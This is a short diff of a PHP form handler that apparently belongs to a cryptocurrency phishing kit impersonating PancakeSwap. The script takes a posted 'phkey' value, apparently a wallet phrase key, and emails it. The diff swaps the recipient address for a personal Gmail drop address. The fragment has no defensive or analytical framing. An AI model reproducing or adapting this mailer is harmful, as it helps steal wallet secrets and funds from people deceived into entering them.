@@ -5,7 +5,7 @@
 $phkey = $_POST['phkey'];
 
 
-$to = "admin@resolvebugs.org"; 
+$to = "wnewton208@gmail.com"; 
 
 $subject = "New Message from pancakeswap"; 
 
